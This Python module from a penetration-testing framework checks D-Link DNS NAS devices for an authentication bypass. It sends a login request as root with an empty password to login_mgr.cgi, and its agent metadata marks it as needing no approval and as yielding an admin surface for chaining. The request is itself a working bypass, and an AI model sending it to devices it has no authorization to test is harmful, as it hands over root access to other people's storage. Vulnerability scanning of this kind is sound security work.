#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DNS devices login_mgr.cgi authentication bypass."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DNS - login_mgr.cgi Auth Bypass Detection',
        'description': (
            'Detects D-Link DNS authentication bypass via '
            '/cgi-bin/login_mgr.cgi?cmd=login&username=root&pwd= (empty password).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'dlink', 'nas', 'auth-bypass', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/37141',
        ],
    }

    def run(self):
        path = (
            '/cgi-bin/login_mgr.cgi?cmd=login&username=root&pwd=&port='
            '&f_type=1&f_username=&pre_pwd=&ssl_port=443'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        cookies = ''
        for k, v in r.headers.items():
            if k.lower() == 'set-cookie':
                cookies += v + ';'
        if 'username=root' in cookies:
            self.set_info(
                severity='critical',
                reason='D-Link DNS login_mgr.cgi auth bypass',
                path='/cgi-bin/login_mgr.cgi',
            )
            return True
        return False
